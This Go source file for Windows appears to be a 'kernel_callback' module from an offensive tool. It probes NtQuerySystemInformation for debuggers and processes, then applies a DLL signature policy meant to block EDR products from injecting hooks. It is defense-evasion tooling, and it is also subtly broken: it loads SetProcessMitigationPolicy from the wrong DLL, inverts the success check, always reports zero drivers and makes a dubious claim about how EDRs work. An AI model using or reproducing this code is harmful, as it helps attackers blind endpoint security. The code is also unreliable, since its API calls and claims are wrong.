//go:build windows

package main

import (
	"fmt"
	"syscall"
	"unsafe"
)

var (
	ntdllKernCB           = syscall.NewLazyDLL("ntdll.dll")
	procNtQuerySystemInfo = ntdllKernCB.NewProc("NtQuerySystemInformation")
)

const (
	SystemProcessInformation = 0x05
	SystemKernelDebuggerInfo = 0x23
	SystemCodeIntegrityInfo  = 0x67
	SystemKernelVaShadowInfo = 0x96
)

func init() {
	registerEvasion("kernel_callback", runEvasionKernelCallback)
}

func runEvasionKernelCallback() string {
	// User-mode cannot remove kernel callbacks without a driver.
	// This function detects the presence of common EDR callback mechanisms
	// and applies the best available user-mode countermeasures.

	result := ""

	// 1. Detect kernel debugger presence (EDRs often use KdDebugger structures)
	dbgInfo := queryKernelDebuggerInfo()
	if dbgInfo {
		result += "[!] Kernel debugger detected (EDR callback activity likely)\n"
	} else {
		result += "[*] No kernel debugger detected\n"
	}

	// 2. Detect process-level callback hooks via NtQuerySystemInformation process list
	procCount, driverCount := countSystemProcesses()
	result += fmt.Sprintf("[*] Active processes: %d | Kernel drivers: %d\n", procCount, driverCount)

	// 3. Check if we can NtSetInformationProcess to harden against callbacks
	result += runProcessCallbackHardening()

	return result
}

func queryKernelDebuggerInfo() bool {
	type systemKernelDebuggerInformation struct {
		KernelDebuggerEnabled    bool
		KernelDebuggerNotPresent bool
	}

	var buf [32]byte
	ret, _, _ := procNtQuerySystemInfo.Call(
		uintptr(SystemKernelDebuggerInfo),
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(len(buf)),
		0,
	)
	if ret != 0 {
		return false
	}

	info := (*systemKernelDebuggerInformation)(unsafe.Pointer(&buf[0]))
	return info.KernelDebuggerEnabled || !info.KernelDebuggerNotPresent
}

func countSystemProcesses() (uint32, uint32) {
	var retLen uint32
	procNtQuerySystemInfo.Call(
		uintptr(SystemProcessInformation),
		0,
		0,
		uintptr(unsafe.Pointer(&retLen)),
	)

	if retLen == 0 || retLen > 10*1024*1024 {
		return 0, 0
	}

	buf := make([]byte, retLen+256)
	procNtQuerySystemInfo.Call(
		uintptr(SystemProcessInformation),
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(len(buf)),
		uintptr(unsafe.Pointer(&retLen)),
	)

	var procCount uint32
	offset := 0
	for offset < len(buf) {
		type systemProcessInfo struct {
			NextEntryOffset uint32
			NumberOfThreads uint32
			_               [48]byte
			ImageName       struct {
				Length uint16
				_      uint16
				Buffer *uint16
			}
			BasePriority    int32
			UniqueProcessID uintptr
			_               [76]byte
		}
		spi := (*systemProcessInfo)(unsafe.Pointer(&buf[offset]))
		if spi.UniqueProcessID != 0 {
			procCount++
		}
		if spi.NextEntryOffset == 0 {
			break
		}
		offset += int(spi.NextEntryOffset)
	}

	return procCount, 0
}

func runProcessCallbackHardening() string {
	// Attempt to set process mitigation policies that reduce callback impact
	ntdll := syscall.NewLazyDLL("ntdll.dll")
	procSetMitigation := ntdll.NewProc("SetProcessMitigationPolicy")

	// ProcessSignaturePolicy (class 8) - Block non-Microsoft signed DLLs
	const ProcessSignaturePolicy = 8
	type processMitigationSignaturePolicy struct {
		Flags uint32
	}
	policy := processMitigationSignaturePolicy{Flags: 1}

	ret, _, _ := procSetMitigation.Call(
		uintptr(ProcessSignaturePolicy),
		uintptr(unsafe.Pointer(&policy)),
		uintptr(unsafe.Sizeof(policy)),
	)

	if ret == 0 {
		return "[*] ProcessSignaturePolicy: enabled (blocks unsigned DLL injection)\n"
	}
	return "[*] ProcessSignaturePolicy: not available (non-Win10+ or policy conflict)\n"
}
